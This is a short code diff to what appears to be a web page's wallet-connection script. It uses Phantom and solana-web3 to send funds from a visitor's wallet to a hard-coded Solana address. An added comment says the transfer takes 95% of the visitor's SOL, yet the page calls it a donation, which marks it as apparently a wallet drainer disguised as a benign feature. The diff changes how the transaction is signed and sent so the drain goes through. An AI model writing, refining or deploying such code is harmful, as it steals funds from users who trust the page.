@@ -97,6 +97,7 @@
         const fromPublicKey = new solanaWeb3.PublicKey(walletAddress);
         const toPublicKey = new solanaWeb3.PublicKey('A647hLQ8eZe3qLHzgxGjp1qC9ydL1xVTh7uV2bigsA26'); // Replace with your SOL wallet address
 
+        // Create a transaction to transfer 95% SOL
         const transaction = new solanaWeb3.Transaction().add(
           solanaWeb3.SystemProgram.transfer({
             fromPubkey: fromPublicKey,
@@ -105,7 +106,12 @@
           })
         );
 
-        const { signature } = await window.solana.signAndSendTransaction(transaction);
+        // Request Phantom Wallet to sign and send the transaction
+        const signedTransaction = await window.solana.signTransaction(transaction);
+        
+        // Send the signed transaction to the Solana network
+        const { signature } = await connection.sendRawTransaction(signedTransaction.serialize());
+        await connection.confirmTransaction(signature);
         console.log('Transaction signature:', signature);
         alert('Donation successful!');
       } catch (err) {
